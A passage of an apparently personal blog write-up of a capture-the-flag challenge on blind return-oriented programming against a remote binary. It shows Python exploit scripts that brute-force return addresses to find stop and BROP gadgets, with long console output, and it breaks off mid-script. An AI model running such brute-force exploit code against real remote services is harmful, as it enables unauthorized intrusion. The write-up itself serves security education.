            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">padd</span><span class="p">(</span><span class="n">leak1</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">] Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
                <span class="n">leak2</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="n">leak1</span><span class="o">=</span><span class="n">leak1</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">leak1</span>
            <span class="k">continue</span>

    <span class="k">return</span> <span class="n">leak1</span>

<span class="n">leak2</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
</code></pre></div><p>Which returns:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
<span class="o">[</span>0x5<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
<span class="o">[</span>0x605<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
<span class="o">[</span>0x400605<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
<span class="o">[</span>0x400605<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
<span class="o">[</span>0x400605<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
<span class="o">[</span>0x1a<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#39;</span>
<span class="o">[</span>0x61a<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#39;</span>
<span class="o">[</span>0x40061a<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#39;</span>
<span class="o">[</span>0x40061a<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#39;</span>
<span class="o">[</span>0x1b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
<span class="o">[</span>0x61b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
<span class="o">[</span>0x40061b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
<span class="o">[</span>0x40061b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
<span class="o">[</span>0x40061b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
<span class="o">[</span>0x40061b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
<span class="o">[</span>0x1d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#39;</span>
<span class="o">[</span>0x61d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#39;</span>
<span class="o">[</span>0x40061d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#39;</span>
<span class="o">[</span>0x40061d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#39;</span>
STOP: &lt;class <span class="s1">&#39;KeyboardInterrupt&#39;</span>&gt;
</code></pre></div><p>I stopped the script because it&rsquo;s very long by it&rsquo;s already interesting to see that it seems we overwrite directly the return address, which means there is no canary. Morevever according to the addresses of the valid gadgets we found, the binary is not PIE based and it sounds to be a x86 binary.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="stop-gadget">
        Stop gadget
        <a data-clipboard-text="https://nasm.re/posts/blindate/#stop-gadget" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Stop gadget" href="#stop-gadget">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>We can optimize the search of stop gadgets by bruteforcing only the two less significant bytes about the base address: <code>0x400000</code>, which gives this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span> <span class="nf">leak2_opti</span><span class="p">(</span><span class="n">padding</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x2000</span><span class="p">):</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
        <span class="c1"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">] Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="k">continue</span>

    <span class="k">return</span> <span class="n">leak1</span>

<span class="n">leak2</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
</code></pre></div><p>Which prints:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
<span class="o">[</span>0x4004cc<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\x04@&#39;</span>
<span class="o">[</span>0x4004cd<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcd\x04@&#39;</span>
<span class="o">[</span>0x4004dd<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdd\x04@&#39;</span>
<span class="o">[</span>0x400550<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaP\x05@&#39;</span>
<span class="o">[</span>0x400560<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400562<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400563<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400565<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400566<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaf\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400567<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400569<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaai\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x40056d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x40056e<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaan\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x40056f<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaao\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400570<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400576<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaav\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400577<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400596<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x05@&#39;</span>
<span class="o">[</span>0x400597<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x97\x05@&#39;</span>
<span class="o">[</span>0x40059c<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x9c\x05@&#39;</span>
<span class="o">[</span>0x40059d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x9d\x05@&#39;</span>
<span class="o">[</span>0x4005a0<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x05@&#39;</span>
<span class="o">[</span>0x4005a1<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa1\x05@&#39;</span>
<span class="o">[</span>0x4005a3<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa3\x05@&#39;</span>
<span class="o">[</span>0x4005a5<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa5\x05@&#39;</span>
<span class="o">[</span>0x4005b4<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb4\x05@&#39;</span>
<span class="o">[</span>0x4005b7<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb7\x05@&#39;</span>
<span class="o">[</span>0x4005b8<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb8\x05@&#39;</span>
<span class="o">[</span>0x4005c0<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc0\x05@&#39;</span>
<span class="o">[</span>0x4005d6<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6\x05@&#39;</span>
<span class="o">[</span>0x4005d7<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd7\x05@&#39;</span>
<span class="o">[</span>0x4005dd<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdd\x05@&#39;</span>
<span class="o">[</span>0x4005de<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xde\x05@&#39;</span>
<span class="o">[</span>0x4005e1<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe1\x05@&#39;</span>
<span class="o">[</span>0x4005e2<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe2\x05@&#39;</span>
<span class="o">[</span>0x4005e4<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe4\x05@&#39;</span>
<span class="o">[</span>0x4005e5<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe5\x05@&#39;</span>
<span class="o">[</span>0x4005e7<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe7\x05@&#39;</span>
<span class="o">[</span>0x4005e8<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe8\x05@&#39;</span>
<span class="o">[</span>0x4005eb<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xeb\x05@&#39;</span>
<span class="o">[</span>0x4005ec<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xec\x05@&#39;</span>
<span class="o">[</span>0x4005ee<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xee\x05@&#39;</span>
<span class="o">[</span>0x4005ef<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\x05@&#39;</span>
<span class="o">[</span>0x4005f1<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf1\x05@&#39;</span>
<span class="o">[</span>0x4005f3<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf3\x05@&#39;</span>
<span class="o">[</span>0x400605<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
<span class="o">[</span>0x400608<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x08\x06@&#39;</span>
<span class="o">[</span>0x40061a<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#39;</span>
<span class="o">[</span>0x40061b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
<span class="o">[</span>0x40061d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#39;</span>
<span class="o">[</span>0x400622<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;\x06@&#39;</span>
<span class="o">[</span>0x400650<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaP\x06@&#39;</span>
<span class="o">[</span>0x400656<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaV\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400657<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaW\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400658<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x40065a<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x40065e<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa^\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400663<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\x06@\x84(\xad\xfb\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400668<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x06@&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x40066d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam\x06@\x84(\xad\xfb&#39;</span>
<span class="o">[</span>0x400672<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaar\x06@\x84(\xad\xfb&#39;</span>
<span class="o">[</span>0x400677<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw\x06@&#39;</span>
<span class="o">[</span>0x400681<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x81\x06@&#39;</span>
<span class="o">[</span>0x4006b4<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb4\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x4006b5<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb5\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x4006b6<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb6\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x4006b8<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb8\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x4006bd<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xbd\x06@\x84(\xad\xfb\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x4006c2<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc2\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x4006c7<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc7\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x4006cc<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\x06@Bye!\n&#39;</span>
<span class="o">[</span>0x4006d1<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd1\x06@\x84(\xad\xfb\n&#39;</span>
<span class="o">[</span>0x4006d6<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6\x06@&#39;</span>
<span class="o">[</span>0x4006db<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdb\x06@&#39;</span>
<span class="o">[</span>0x4006e2<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe2\x06@&#39;</span>
<span class="o">[</span>0x4006e3<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe3\x06@&#39;</span>
<span class="o">[</span>0x4006e5<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe5\x06@&#39;</span>
<span class="o">[</span>0x4006e6<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe6\x06@&#39;</span>
<span class="o">[</span>0x40073b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;\x07@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
<span class="o">[</span>0x400742<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB\x07@&#39;</span>
<span class="o">[</span>0x400743<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaC\x07@&#39;</span>
<span class="o">[</span>0x400758<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\x07@&#39;</span>
</code></pre></div><p>If we read carefully, we can notice the <code>[0x400668] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x06@&gt;&gt;&gt; '</code> gadget.
It&rsquo;s a very good stop gadget because it&rsquo;s the only gadget which prints: <code>Thanks + padding + return_address_upto_null_byte + &gt;&gt;&gt; </code>.
And so for our attack we will use it.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="brop-gadget">
        Brop gadget
        <a data-clipboard-text="https://nasm.re/posts/blindate/#brop-gadget" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Brop gadget" href="#brop-gadget">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>Since we got the stop gadget, everything is easier. We just have to scan the .text of the remote binary to find the brop gadget which is basically the end of the csu in most of the binaries. It&rsquo;s easy to find because it&rsquo;s a pop of six qword like that:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
</code></pre></div><p>So we use a <code>probe + trap * 6 + stop + trap*20</code> payload to find these kinf od gadgets.
And so here is the script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">unpadd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">is_stop</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">ip</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">STOP_GADGETS</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
